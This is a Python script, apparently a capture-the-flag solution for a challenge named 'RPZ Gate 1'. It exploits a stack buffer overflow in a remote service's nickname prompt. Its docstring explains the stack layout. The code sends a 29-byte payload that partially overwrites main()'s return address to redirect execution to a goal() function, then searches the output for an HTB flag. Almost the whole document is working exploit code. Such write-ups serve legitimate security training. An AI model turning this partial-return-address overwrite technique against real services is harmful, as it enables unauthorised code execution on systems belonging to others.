#!/usr/bin/env python3
"""RPZ Gate 1 — partial RIP overwrite to redirect main()'s return into goal().

Vuln: fgets(buf, 30, stdin) where buf is 16 bytes -> 13-byte overflow.
Buffer layout: [16 buf][8 saved rbp][8 return addr]
fgets writes 29 chars + 1 null terminator at offset 29.
That null lands on byte 5 of the return address (which holds 0x7f for libc).
Bytes 6-7 are already 0x00 (canonical). Bytes 0-4 we control.
Send '\\x16\\x13\\x40\\x00\\x00' as the last 5 bytes to redirect to goal() @ 0x401316.
"""
import socket, sys, time

HOST, PORT = sys.argv[1], int(sys.argv[2])
GOAL = 0x401316
TARGET_BYTES = GOAL.to_bytes(5, "little")  # \x16\x13\x40\x00\x00

def recvuntil(s, marker, timeout=5):
    s.settimeout(timeout)
    buf = b""
    while marker not in buf:
        c = s.recv(1)
        if not c: break
        buf += c
    return buf

s = socket.create_connection((HOST, PORT))

# 1. "Show map? (y/n)" — fgets(buf, 3)
recvuntil(s, b"Show map? (y/n): ")
s.sendall(b"y\n")

# 2. "1. Race / 2. Quit" — fgets(buf, 3)
recvuntil(s, b">> ")
s.sendall(b"1\n")

# 3. Nickname prompt — VULNERABLE fgets(buf, 30, stdin)
#    Send exactly 29 bytes WITHOUT a trailing newline so fgets caps at max
#    and writes its null terminator at offset 29 = byte 5 of the return
#    address (overwriting the 0x7f libc byte with 0x00).
recvuntil(s, b"(y/n): ")
payload = b"A" * 16 + b"B" * 8 + TARGET_BYTES
assert len(payload) == 29
s.sendall(payload)

# After fgets returns, main prints "\nGood luck!\n" then ret -> goal().
# goal() prints the map + "You won the race!\nHere is your key: <flag>"
time.sleep(0.5)
s.settimeout(5)
all_out = b""
try:
    while True:
        c = s.recv(4096)
        if not c: break
        all_out += c
except socket.timeout:
    pass
print(all_out.decode(errors='replace'))

# also grep for HTB{
import re
m = re.search(rb"HTB\{[^}]+\}", all_out)
if m:
    print(f"\n[+] FLAG: {m.group(0).decode()}")
else:
    print("\n[!] no flag found in output")
s.close()
